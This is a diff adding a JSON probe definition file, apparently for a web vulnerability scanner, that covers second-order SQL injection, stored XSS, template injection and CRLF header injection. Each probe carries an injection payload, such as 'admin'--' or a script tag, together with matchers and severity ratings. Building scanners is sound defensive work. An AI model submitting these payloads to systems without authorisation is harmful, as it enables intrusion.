@@ -1,0 +1,99 @@
+{
+  "category": "second_order",
+  "contexts": {
+    "stored_sqli": {
+      "description": "Second-order SQL injection -- payload stored via one endpoint, triggered when retrieved/processed by another",
+      "tech_match": ["MySQL", "PostgreSQL", "MSSQL", "SQLite", "PHP", "Java", "ASP.NET"],
+      "param_match": ["name", "username", "email", "title", "description", "comment", "address", "company", "bio", "note"],
+      "probes": [
+        {
+          "payload": "test'||'swk",
+          "description": "String concatenation probe stored in profile/name field -- triggers when value is used unsanitized in a different query context (reports, admin views, exports)",
+          "matchers": [
+            {"type": "word", "words": ["testswk"]},
+            {"type": "not_word", "words": ["test'||'swk"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "admin'--",
+          "description": "Comment injection in stored username -- if used in WHERE clause on admin panel, it truncates the query",
+          "matchers": [
+            {"type": "word", "words": ["sql", "syntax", "error", "unclosed quotation"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "stored_xss": {
+      "description": "Stored XSS -- payload saved in one context, rendered in another (admin panel, email, PDF export, notification)",
+      "tech_match": [],
+      "param_match": ["name", "username", "email", "title", "description", "comment", "bio", "review", "feedback", "message"],
+      "probes": [
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "description": "Image tag XSS in stored field -- triggers when rendered in admin panel, email template, or PDF export without sanitization",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "swk\"><script>alert(1)</script>",
+          "description": "Attribute breakout XSS in stored field -- triggers when value rendered inside HTML attribute in different context",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "stored_ssti": {
+      "description": "Second-order SSTI -- template expression stored via user input, executed when rendered in email template, PDF, or report",
+      "tech_match": ["Jinja2", "Twig", "Freemarker", "Thymeleaf", "Pebble", "Velocity", "ERB", "Handlebars"],
+      "param_match": ["name", "title", "description", "template", "subject", "message", "greeting"],
+      "probes": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Jinja2/Twig expression in stored field -- if email/PDF template engine processes the stored value, 49 appears in output",
+          "matchers": [
+            {"type": "word", "words": ["49"]},
+            {"type": "not_word", "words": ["{{7*7}}"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "${7*7}",
+          "description": "Freemarker/EL expression in stored field -- processed when value rendered in server-side template",
+          "matchers": [
+            {"type": "word", "words": ["49"]},
+            {"type": "not_word", "words": ["${7*7}"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "stored_header_injection": {
+      "description": "Second-order header injection -- stored value used in HTTP response headers (Set-Cookie, Location, Content-Disposition)",
+      "tech_match": [],
+      "param_match": ["filename", "name", "title", "redirect_url", "download_name"],
+      "probes": [
+        {
+          "payload": "test\r\nX-Injected: swk_canary",
+          "description": "CRLF in stored filename -- when used in Content-Disposition header on download, injects arbitrary headers",
+          "matchers": [
+            {"type": "header", "name": "X-Injected", "contains": "swk_canary"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
